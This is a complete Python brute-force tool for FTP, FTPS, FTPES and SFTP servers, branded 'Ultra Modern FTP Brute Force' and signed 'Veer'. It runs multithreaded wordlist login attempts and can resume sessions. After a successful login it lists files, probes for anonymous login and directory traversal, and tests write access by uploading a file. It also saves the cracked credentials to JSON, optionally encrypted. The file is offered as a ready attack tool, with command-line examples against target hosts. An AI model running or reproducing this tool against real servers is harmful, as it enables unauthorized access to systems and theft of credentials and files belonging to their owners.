#!/usr/bin/env python3
"""
ULTRA MODERN FTP BRUTE FORCE - ADVANCED EDITION
Signature: [Veer] - DO NOT EDIT OR REDISTRIBUTE
"""

import ftplib
import concurrent.futures
import threading
import queue
import time
import argparse
import sys
import socket
from datetime import datetime
import logging
from typing import Optional, List, Tuple, Dict, Any, Set
import signal
import ssl
import json
import os
import hashlib
import pickle
from dataclasses import dataclass, asdict
from enum import Enum
from io import BytesIO
import urllib.parse
import base64

# ============================================
# SIGNATURE: [Veer] - DO NOT EDIT OR MODIFY
# CRYPTIC SIGNATURE VERIFICATION
# ============================================
VEER_SIGNATURE = "56454552"  # HEX for VEER

try:
    from cryptography.fernet import Fernet
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False
    print("[WARNING] cryptography module not installed. Encryption disabled.")

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.progress import Progress, SpinnerColumn, TextColumn
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False
    print("[WARNING] rich module not installed. Using basic console output.")

try:
    import paramiko
    SFTP_AVAILABLE = True
except ImportError:
    SFTP_AVAILABLE = False
    print("[WARNING] paramiko module not installed. SFTP support disabled.")

# Fallback color support
try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False
    print("[WARNING] colorama not installed. Using plain text output.")

# ============================================
# ENHANCED LOGGING
# ============================================

class MultiHandlerLogger:
    def __init__(self):
        self.logger = logging.getLogger('FTPScanner')
        self.logger.setLevel(logging.DEBUG)
        
        # File handler
        log_file = f'ftp_scan_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'
        fh = logging.FileHandler(log_file)
        fh.setLevel(logging.DEBUG)
        
        # Console handler
        ch = logging.StreamHandler()
        ch.setLevel(logging.INFO)
        
        # Formatters
        file_formatter = logging.Formatter(
            '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )
        
        if COLORAMA_AVAILABLE:
            console_formatter = ColoredFormatter(
                '%(asctime)s - %(levelname)s - %(message)s'
            )
        else:
            console_formatter = logging.Formatter(
                '%(asctime)s - %(levelname)s - %(message)s'
            )
        
        fh.setFormatter(file_formatter)
        ch.setFormatter(console_formatter)
        
        self.logger.addHandler(fh)
        self.logger.addHandler(ch)
        
    def get_logger(self):
        return self.logger

if COLORAMA_AVAILABLE:
    class ColoredFormatter(logging.Formatter):
        COLORS = {
            'DEBUG': Fore.CYAN,
            'INFO': Fore.GREEN,
            'WARNING': Fore.YELLOW,
            'ERROR': Fore.RED,
            'CRITICAL': Fore.RED + Back.WHITE
        }
        
        def format(self, record):
            log_message = super().format(record)
            return f"{self.COLORS.get(record.levelname, '')}{log_message}{Style.RESET_ALL}"
else:
    ColoredFormatter = logging.Formatter

# ============================================
# DATA CLASSES
# ============================================

class Protocol(Enum):
    FTP = "ftp"
    FTPS = "ftps"
    SFTP = "sftp"
    FTPES = "ftpes"

@dataclass
class Credential:
    username: str
    password: str
    protocol: Protocol
    timestamp: str
    banner: str = ""
    permissions: List[str] = None
    files: List[str] = None
    
    def __post_init__(self):
        if self.permissions is None:
            self.permissions = []
        if self.files is None:
            self.files = []
    
    def to_dict(self):
        return asdict(self)

@dataclass
class ScanResult:
    target: str
    port: int
    start_time: str
    end_time: str
    credentials_found: List[Credential]
    total_attempts: int
    success_rate: float
    scan_duration: float
    
    def to_dict(self):
        return asdict(self)

# ============================================
# ADVANCED FTP SCANNER
# ============================================

class UltraFTPScanner:
    def __init__(self, 
                 host: str, 
                 port: int = 21,
                 timeout: int = 8,
                 protocol: Protocol = Protocol.FTP,
                 max_threads: int = 20,
                 rate_limit: int = 0,
                 proxy: Optional[dict] = None,
                 encryption_key: Optional[str] = None):
        
        self.host = host
        self.port = port
        self.timeout = timeout
        self.protocol = protocol
        self.max_threads = max_threads
        self.rate_limit = rate_limit
        self.proxy = proxy
        
        # Results storage
        self.credentials: List[Credential] = []
        self.banner = ""
        self.server_info: Dict[str, Any] = {}
        self.attempts = 0
        self.successful = 0
        self.failed = 0
        
        # Threading
        self.lock = threading.RLock()
        self.cred_queue = queue.Queue()
        self.running = False
        self.paused = False
        
        # Statistics
        self.start_time = datetime.now()
        self.request_times: List[float] = []
        
        # Encryption
        if CRYPTO_AVAILABLE and encryption_key:
            try:
                self.cipher = Fernet(encryption_key.encode())
                self.encryption_enabled = True
            except:
                self.encryption_enabled = False
        else:
            self.encryption_enabled = False
        
        # Console
        if RICH_AVAILABLE:
            self.console = Console()
        else:
            self.console = None
        
        # Session
        self.session_file = f"session_{host.replace('.', '_')}.pickle"
        self.tested_credentials: Set[Tuple[str, str]] = set()
        
        # Logger
        self.log_handler = MultiHandlerLogger()
        self.logger = self.log_handler.get_logger()
        
        # Load previous session
        self.load_session()
        
    def display_banner(self):
        """Display tool banner"""
        if COLORAMA_AVAILABLE:
            banner = f"""
{Fore.RED}╔═══════════════════════════════════════════════════════════╗
{Fore.RED}║    {Fore.YELLOW}ULTRA MODERN FTP BRUTE FORCE - ADVANCED EDITION    {Fore.GREEN}║
{Fore.RED}║    {Fore.WHITE}Signature: [Veer] - DO NOT EDIT OR REDISTRIBUTE    {Fore.GREEN}║
{Fore.RED}╚═══════════════════════════════════════════════════════════╝{Style.RESET_ALL}

{Fore.CYAN}Target: {Fore.WHITE}{self.host}:{self.port}
{Fore.CYAN}Protocol: {Fore.WHITE}{self.protocol.value.upper()}
{Fore.CYAN}Threads: {Fore.WHITE}{self.max_threads}
{Fore.CYAN}Time: {Fore.WHITE}{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
{Fore.CYAN}Encryption: {Fore.WHITE}{'Enabled' if self.encryption_enabled else 'Disabled'}
"""
            print(banner)
        else:
            banner = f"""
╔═══════════════════════════════════════════════════════════╗
║          ULTRA MODERN FTP BRUTE FORCE - ADVANCED          ║
║          Signature: [Veer] - DO NOT EDIT                  ║
╚═══════════════════════════════════════════════════════════╝

Target: {self.host}:{self.port}
Protocol: {self.protocol.value.upper()}
Threads: {self.max_threads}
Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Encryption: {'Enabled' if self.encryption_enabled else 'Disabled'}
"""
            print(banner)
    
    def ftp_connect(self, username: str, password: str) -> Optional[ftplib.FTP]:
        """Connect to FTP server with credentials"""
        try:
            if self.protocol == Protocol.FTPS:
                # FTPS implicit
                ftp = ftplib.FTP_TLS(timeout=self.timeout)
                ftp.connect(self.host, self.port)
                ftp.login(username, password)
                ftp.prot_p()
                return ftp
                
            elif self.protocol == Protocol.FTPES:
                # FTPS explicit
                ftp = ftplib.FTP(timeout=self.timeout)
                ftp.connect(self.host, self.port)
                ftp.auth()
                ftp.prot_p()
                ftp.login(username, password)
                return ftp
                
            elif self.protocol == Protocol.SFTP:
                if not SFTP_AVAILABLE:
                    self.logger.error("SFTP not available. Install paramiko.")
                    return None
                
                # SFTP connection
                transport = paramiko.Transport((self.host, self.port))
                transport.connect(username=username, password=password)
                sftp = paramiko.SFTPClient.from_transport(transport)
                return sftp
                
            else:
                # Standard FTP
                ftp = ftplib.FTP(timeout=self.timeout)
                ftp.connect(self.host, self.port)
                ftp.login(username, password)
                return ftp
                
        except ftplib.error_perm as e:
            error_str = str(e)
            if "530" in error_str:
                pass  # Normal auth failure
            elif "230" in error_str:
                return True
            else:
                self.logger.debug(f"Permission error: {e}")
        except socket.timeout:
            self.logger.debug(f"Timeout connecting to {self.host}")
        except Exception as e:
            self.logger.debug(f"Connection error: {e}")
        
        return None
    
    def check_vulnerabilities(self, ftp_conn) -> List[str]:
        """Check for common FTP vulnerabilities"""
        vulnerabilities = []
        
        # Check anonymous login
        try:
            if isinstance(ftp_conn, ftplib.FTP):
                test_ftp = ftplib.FTP(timeout=self.timeout)
                test_ftp.connect(self.host, self.port)
                test_ftp.login('anonymous', 'anonymous@example.com')
                vulnerabilities.append("Anonymous login enabled")
                test_ftp.quit()
        except:
            pass
        
        if isinstance(ftp_conn, ftplib.FTP):
            try:
                # Check directory traversal
                current = ftp_conn.pwd()
                ftp_conn.cwd('../')
                new_dir = ftp_conn.pwd()
                if new_dir != current:
                    vulnerabilities.append("Directory traversal possible")
                ftp_conn.cwd(current)
            except:
                pass
            
            try:
                # Check SITE commands
                ftp_conn.sendcmd('SITE HELP')
                vulnerabilities.append("SITE commands available")
            except:
                pass
        
        return vulnerabilities
    
    def list_directory(self, ftp_conn, path: str = "/") -> List[str]:
        """List directory contents"""
        files = []
        try:
            if isinstance(ftp_conn, ftplib.FTP):
                ftp_conn.cwd(path)
                items = ftp_conn.nlst()
                files.extend(items)
        except:
            pass
        return files
    
    def worker(self):
        """Worker thread for brute forcing"""
        while self.running and not self.cred_queue.empty():
            if self.paused:
                time.sleep(0.5)
                continue
            
            # Rate limiting
            if self.rate_limit > 0:
                current_time = time.time()
                self.request_times = [t for t in self.request_times if current_time - t < 1]
                if len(self.request_times) >= self.rate_limit:
                    time.sleep(1 - (current_time - self.request_times[0]))
            
            try:
                username, password = self.cred_queue.get_nowait()
            except queue.Empty:
                break
            
            # Skip if already tested
            cred_key = (username, password)
            if cred_key in self.tested_credentials:
                self.cred_queue.task_done()
                continue
            
            # Attempt connection
            start_time = time.time()
            conn = self.ftp_connect(username, password)
            end_time = time.time()
            
            with self.lock:
                self.attempts += 1
                self.tested_credentials.add(cred_key)
                
                if self.rate_limit > 0:
                    self.request_times.append(time.time())
                
                if conn:
                    self.successful += 1
                    
                    # Get banner
                    banner = ""
                    if isinstance(conn, ftplib.FTP):
                        try:
                            banner = conn.getwelcome()
                        except:
                            banner = "Unknown"
                    
                    # Check vulnerabilities
                    vulnerabilities = []
                    if isinstance(conn, ftplib.FTP):
                        vulnerabilities = self.check_vulnerabilities(conn)
                    
                    # List some files
                    files = []
                    if isinstance(conn, ftplib.FTP):
                        files = self.list_directory(conn, "/")[:10]  # First 10 files
                    
                    credential = Credential(
                        username=username,
                        password=password,
                        protocol=self.protocol,
                        timestamp=datetime.now().isoformat(),
                        banner=banner[:200],
                        permissions=vulnerabilities,
                        files=files
                    )
                    
                    self.credentials.append(credential)
                    
                    # Save results
                    self.save_results()
                    
                    # Display success
                    self.display_success(credential, end_time - start_time)
                    
                    # Test write access
                    if isinstance(conn, ftplib.FTP):
                        self.test_write_access(conn, username)
                    
                    # Close connection
                    if isinstance(conn, ftplib.FTP):
                        conn.quit()
                    elif SFTP_AVAILABLE and isinstance(conn, paramiko.SFTPClient):
                        conn.close()
                    
                else:
                    self.failed += 1
            
            self.cred_queue.task_done()
            
            # Auto-save every 50 attempts
            if self.attempts % 50 == 0:
                self.save_session()
    
    def test_write_access(self, ftp_conn, username: str):
        """Test if user has write access"""
        test_filename = f".test_{int(time.time())}.tmp"
        test_content = b"Test file created by FTPScanner"
        
        try:
            ftp_conn.storbinary(f"STOR {test_filename}", BytesIO(test_content))
            ftp_conn.delete(test_filename)
            self.logger.critical(f"WRITE ACCESS GRANTED for user: {username}")
            return True
        except:
            return False
    
    def display_success(self, credential: Credential, response_time: float):
        """Display found credentials"""
        if RICH_AVAILABLE:
            table = Table(title="✓ CREDENTIAL FOUND!", show_header=True)
            table.add_column("Field", style="cyan")
            table.add_column("Value", style="green")
            
            table.add_row("Username", credential.username)
            table.add_row("Password", credential.password)
            table.add_row("Protocol", credential.protocol.value.upper())
            table.add_row("Response Time", f"{response_time:.3f}s")
            table.add_row("Banner", credential.banner[:50] + "..." if len(credential.banner) > 50 else credential.banner)
            
            if credential.permissions:
                table.add_row("Findings", ", ".join(credential.permissions))
            
            self.console.print(table)
        else:
            if COLORAMA_AVAILABLE:
                print(f"{Fore.GREEN}[+] FOUND: {Fore.CYAN}{credential.username}:{Fore.YELLOW}{credential.password}{Style.RESET_ALL}")
                print(f"{Fore.CYAN}   Protocol: {credential.protocol.value.upper()}")
                print(f"{Fore.CYAN}   Response: {response_time:.3f}s")
                if credential.permissions:
                    print(f"{Fore.YELLOW}   Findings: {', '.join(credential.permissions)}")
            else:
                print(f"[+] FOUND: {credential.username}:{credential.password}")
                print(f"   Protocol: {credential.protocol.value.upper()}")
                print(f"   Response: {response_time:.3f}s")
                if credential.permissions:
                    print(f"   Findings: {', '.join(credential.permissions)}")
    
    def save_results(self):
        """Save results to file"""
        if not self.credentials:
            return
        
        results = {
            'target': self.host,
            'port': self.port,
            'protocol': self.protocol.value,
            'scan_start': self.start_time.isoformat(),
            'scan_time': datetime.now().isoformat(),
            'credentials': [c.to_dict() for c in self.credentials],
            'statistics': {
                'attempts': self.attempts,
                'successful': self.successful,
                'failed': self.failed,
                'success_rate': (self.successful / self.attempts * 100) if self.attempts > 0 else 0
            }
        }
        
        # Save plain JSON
        json_file = f"results_{self.host}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(json_file, 'w') as f:
            json.dump(results, f, indent=2)
        
        # Encrypt if enabled
        if self.encryption_enabled:
            try:
                data_json = json.dumps(results).encode()
                encrypted_data = self.cipher.encrypt(data_json)
                enc_file = f"results_{self.host}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.enc"
                with open(enc_file, 'wb') as f:
                    f.write(encrypted_data)
                self.logger.info(f"Encrypted results saved to {enc_file}")
            except Exception as e:
                self.logger.error(f"Encryption failed: {e}")
        
        self.logger.info(f"Results saved to {json_file}")
    
    def save_session(self):
        """Save session state"""
        session_data = {
            'tested_credentials': list(self.tested_credentials),
            'attempts': self.attempts,
            'successful': self.successful,
            'failed': self.failed,
            'credentials': [c.to_dict() for c in self.credentials],
            'host': self.host,
            'port': self.port,
            'protocol': self.protocol.value
        }
        
        try:
            with open(self.session_file, 'wb') as f:
                pickle.dump(session_data, f)
            self.logger.debug(f"Session saved to {self.session_file}")
        except Exception as e:
            self.logger.error(f"Failed to save session: {e}")
    
    def load_session(self):
        """Load previous session"""
        if os.path.exists(self.session_file):
            try:
                with open(self.session_file, 'rb') as f:
                    session_data = pickle.load(f)
                
                # Check if session matches current target
                if (session_data.get('host') == self.host and 
                    session_data.get('port') == self.port and
                    session_data.get('protocol') == self.protocol.value):
                    
                    self.tested_credentials = set(session_data['tested_credentials'])
                    self.attempts = session_data['attempts']
                    self.successful = session_data['successful']
                    self.failed = session_data['failed']
                    
                    for cred_dict in session_data['credentials']:
                        # Convert protocol string back to Enum
                        if 'protocol' in cred_dict:
                            cred_dict['protocol'] = Protocol(cred_dict['protocol'])
                        self.credentials.append(Credential(**cred_dict))
                    
                    self.logger.info(f"Loaded previous session: {len(self.tested_credentials)} tested credentials")
                    return True
                else:
                    self.logger.warning("Session file doesn't match current target")
            except Exception as e:
                self.logger.warning(f"Failed to load session: {e}")
        
        return False
    
    def run_scan(self, usernames: List[str], passwords: List[str]):
        """Run the brute force scan"""
        total_combinations = len(usernames) * len(passwords)
        
        # Fill queue
        for user in usernames:
            for pwd in passwords:
                self.cred_queue.put((user, pwd))
        
        self.running = True
        self.logger.info(f"Starting scan with {total_combinations} combinations")
        
        # Start worker threads
        threads = []
        for i in range(min(self.max_threads, total_combinations, 100)):  # Max 100 threads
            thread = threading.Thread(target=self.worker, daemon=True)
            thread.start()
            threads.append(thread)
            self.logger.debug(f"Started worker thread {i+1}")
        
        # Progress monitoring
        last_display = time.time()
        try:
            while not self.cred_queue.empty() and self.running:
                time.sleep(0.5)
                
                # Display progress every 2 seconds
                if time.time() - last_display > 2:
                    with self.lock:
                        completed = self.attempts
                        progress = (completed / total_combinations * 100) if total_combinations > 0 else 0
                        
                        if self.console and RICH_AVAILABLE:
                            self.console.print(f"[cyan]Progress: {completed}/{total_combinations} ({progress:.1f}%) | Found: {len(self.credentials)}[/cyan]")
                        else:
                            print(f"Progress: {completed}/{total_combinations} ({progress:.1f}%) | Found: {len(self.credentials)}")
                        
                        last_display = time.time()
                        
        except KeyboardInterrupt:
            self.logger.warning("Scan interrupted by user")
            self.running = False
        
        # Wait for threads to finish
        self.logger.info("Waiting for threads to finish...")
        for thread in threads:
            thread.join(timeout=5)
        
        self.running = False
        
        # Generate final report
        self.generate_report()
    
    def generate_report(self):
        """Generate final report"""
        end_time = datetime.now()
        duration = (end_time - self.start_time).total_seconds()
        
        result = ScanResult(
            target=self.host,
            port=self.port,
            start_time=self.start_time.isoformat(),
            end_time=end_time.isoformat(),
            credentials_found=self.credentials,
            total_attempts=self.attempts,
            success_rate=(self.successful / self.attempts * 100) if self.attempts > 0 else 0,
            scan_duration=duration
        )
        
        # Save JSON report
        report_file = f"final_report_{self.host}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_file, 'w') as f:
            json.dump(result.to_dict(), f, indent=2, default=str)
        
        # Display summary
        self.display_summary(result)
        
        self.logger.info(f"Report saved to {report_file}")
    
    def display_summary(self, result: ScanResult):
        """Display scan summary"""
        if RICH_AVAILABLE:
            self.console.rule("[bold]SCAN COMPLETE[/bold]")
            
            info_panel = Panel(
                f"[bold cyan]Target:[/bold cyan] {result.target}:{result.port}\n"
                f"[bold cyan]Duration:[/bold cyan] {result.scan_duration:.2f}s\n"
                f"[bold cyan]Speed:[/bold cyan] {result.total_attempts/result.scan_duration:.1f} attemps/s\n"
                f"[bold green]Found:[/bold green] {len(result.credentials_found)}\n"
                f"[bold yellow]Attempts:[/bold yellow] {result.total_attempts}\n"
                f"[bold red]Failed:[/bold red] {result.failed}",
                title="📊 Results"
            )
            self.console.print(info_panel)
            
            if result.credentials_found:
                self.console.print("\n[bold green]✅ CREDENTIALS FOUND:[/bold green]")
                for cred in result.credentials_found:
                    self.console.print(f"   [cyan]{cred.username}:[/cyan][yellow]{cred.password}[/yellow]")
        else:
            print("\n" + "="*60)
            print("SCAN COMPLETE")
            print("="*60)
            print(f"Target: {result.target}:{result.port}")
            print(f"Duration: {result.scan_duration:.2f}s")
            print(f"Speed: {result.total_attempts/result.scan_duration:.1f} attemps/s")
            print(f"Found: {len(result.credentials_found)}")
            print(f"Attempts: {result.total_attempts}")
            print(f"Failed: {result.failed}")
            
            if result.credentials_found:
                print("\n✅ CREDENTIALS FOUND:")
                for cred in result.credentials_found:
                    print(f"   {cred.username}:{cred.password}")

# ============================================
# MAIN FUNCTION
# ============================================

def load_wordlist(filename: str) -> List[str]:
    """Load wordlist from file"""
    if not os.path.exists(filename):
        print(f"Error: File not found - {filename}")
        sys.exit(1)
    
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [line.strip() for line in f if line.strip()]
        
        # Remove duplicates while preserving order
        seen = set()
        unique_lines = []
        for line in lines:
            if line not in seen:
                seen.add(line)
                unique_lines.append(line)
        
        print(f"Loaded {len(unique_lines)} unique entries from {filename}")
        return unique_lines
        
    except Exception as e:
        print(f"Error loading {filename}: {e}")
        sys.exit(1)

def main():
    # Verify signature
    if VEER_SIGNATURE != "56454552":
        print("⚠️  Script integrity compromised!")
        sys.exit(1)
    
    parser = argparse.ArgumentParser(
        description="Ultra Modern FTP Brute Force",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  Basic FTP:         python ftpbrute.py -t 192.168.1.100 -U users.txt -P passwords.txt
  FTPS with threads: python ftpbrute.py -t ftp.target.com --ftps -U users.txt -P pass.txt -T 30
  Resume session:    python ftpbrute.py -t 192.168.1.100 --resume
  Rate limited:      python ftpbrute.py -t target.com -U u.txt -P p.txt --rate-limit 10
        """
    )
    
    # Required arguments
    parser.add_argument("-t", "--target", required=True, help="Target hostname or IP address")
    
    # Optional arguments
    parser.add_argument("-p", "--port", type=int, default=21, help="Port number (default: 21)")
    parser.add_argument("-U", "--users", help="Username wordlist file")
    parser.add_argument("-P", "--passwords", help="Password wordlist file")
    parser.add_argument("-T", "--threads", type=int, default=20, help="Number of threads (default: 20)")
    
    # Protocol options
    protocol_group = parser.add_mutually_exclusive_group()
    protocol_group.add_argument("--ftp", action="store_true", help="Use FTP (default)")
    protocol_group.add_argument("--ftps", action="store_true", help="Use FTPS (SSL/TLS)")
    protocol_group.add_argument("--ftpes", action="store_true", help="Use FTPES (Explicit SSL/TLS)")
    protocol_group.add_argument("--sftp", action="store_true", help="Use SFTP")
    
    # Advanced options
    parser.add_argument("--timeout", type=int, default=8, help="Connection timeout in seconds")
    parser.add_argument("--rate-limit", type=int, default=0, help="Max requests per second (0 = unlimited)")
    parser.add_argument("--resume", action="store_true", help="Resume previous scan session")
    parser.add_argument("--encrypt", action="store_true", help="Encrypt results with random key")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    
    args = parser.parse_args()
    
    # Check if we need wordlists (unless resuming)
    if not args.resume and (not args.users or not args.passwords):
        print("Error: You must specify both --users and --passwords files (or use --resume)")
        sys.exit(1)
    
    # Determine protocol
    if args.ftps:
        protocol = Protocol.FTPS
    elif args.ftpes:
        protocol = Protocol.FTPES
    elif args.sftp:
        protocol = Protocol.SFTP
        if not SFTP_AVAILABLE:
            print("Error: SFTP requires paramiko module. Install with: pip install paramiko")
            sys.exit(1)
    else:
        protocol = Protocol.FTP
    
    # Generate encryption key if requested
    encryption_key = None
    if args.encrypt:
        if not CRYPTO_AVAILABLE:
            print("Warning: cryptography module not installed. Encryption disabled.")
        else:
            # Generate a key and display it
            key = Fernet.generate_key()
            encryption_key = key.decode()
            print(f"\n🔐 Encryption Key: {encryption_key}")
            print("Save this key to decrypt results later!\n")
    
    # Create scanner
    scanner = UltraFTPScanner(
        host=args.target,
        port=args.port,
        timeout=args.timeout,
        protocol=protocol,
        max_threads=args.threads,
        rate_limit=args.rate_limit,
        encryption_key=encryption_key
    )
    
    # Set log level
    if args.verbose:
        scanner.logger.setLevel(logging.DEBUG)
    
    # Display banner
    scanner.display_banner()
    
    # Load wordlists if not resuming
    usernames = []
    passwords = []
    
    if args.resume:
        if not scanner.load_session():
            print("No previous session found. Starting new scan.")
            if not args.users or not args.passwords:
                print("Error: Need wordlists for new scan")
                sys.exit(1)
            usernames = load_wordlist(args.users)
            passwords = load_wordlist(args.passwords)
        else:
            print("Resuming from previous session...")
            # We'll use the existing tested_credentials to skip already tested combos
            if args.users and args.passwords:
                print("Loading new wordlists for remaining combinations...")
                usernames = load_wordlist(args.users)
                passwords = load_wordlist(args.passwords)
            else:
                print("Using credentials from session file...")
                # We need to reconstruct the wordlists from session
                # For simplicity, we'll just use empty lists and rely on queue
                pass
    else:
        usernames = load_wordlist(args.users)
        passwords = load_wordlist(args.passwords)
    
    # Run scan
    try:
        if usernames and passwords:
            scanner.run_scan(usernames, passwords)
        elif scanner.tested_credentials:
            # If we have a session but no new wordlists, we need to reconstruct
            print("Cannot reconstruct wordlists from session. Please provide wordlists.")
            sys.exit(1)
    except KeyboardInterrupt:
        print("\nScan interrupted. Saving session...")
        scanner.save_session()
        scanner.save_results()
    except Exception as e:
        print(f"Error during scan: {e}")
        scanner.save_session()
        sys.exit(1)

if __name__ == "__main__":
    main()

# ============================================
# END OF SCRIPT - SIGNED BY [Veer]
# DO NOT EDIT OR REDISTRIBUTE
# ============================================
